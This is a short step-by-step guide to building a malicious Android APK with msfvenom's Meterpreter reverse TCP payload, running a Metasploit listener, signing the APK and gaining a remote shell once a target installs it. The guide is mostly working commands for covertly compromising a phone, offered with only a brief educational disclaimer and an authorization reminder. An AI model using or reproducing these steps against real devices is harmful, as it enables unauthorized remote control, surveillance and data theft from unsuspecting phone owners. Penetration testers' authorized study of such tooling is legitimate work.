**Metasploit Android Reverse Shell Setup**

This guide provides instructions on generating a malicious Android APK with a reverse shell using Metasploit's `msfvenom` and setting up a listener to capture the incoming connection.

**Disclaimer:** This information is intended for educational purposes only. Unauthorized use of these techniques is illegal and unethical.

## Prerequisites

- Linux system
- Metasploit Framework installed
- `apksigner` and `zipalign` tools

## Steps

### 1. Generate the Malicious APK

Use `msfvenom` to create an Android payload:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -o malicious.apk
```

Replace:

- `<your_IP>`: Your local or public IP address
- `<your_port>`: Port to listen on (e.g., 4444)

**Note:** For external connections, use your public IP and ensure proper port forwarding.

### 2. Set Up the Metasploit Listener

Launch Metasploit and configure the listener:

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT <your_port>
exploit
```

For public IP setups, set `LHOST` to `0.0.0.0` to accept connections from any network.

### 3. Sign the APK

Android requires APKs to be signed. Generate a keystore and sign the APK:

```bash
keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore malicious.apk my-key-alias
```

### 4. Deploy and Execute

Once the target installs and opens the APK, Metasploit should establish a Meterpreter session:

```bash
meterpreter >
```


You can now execute commands on the compromised device.

**Important:** Always obtain proper authorization before conducting penetration tests or deploying such tools.
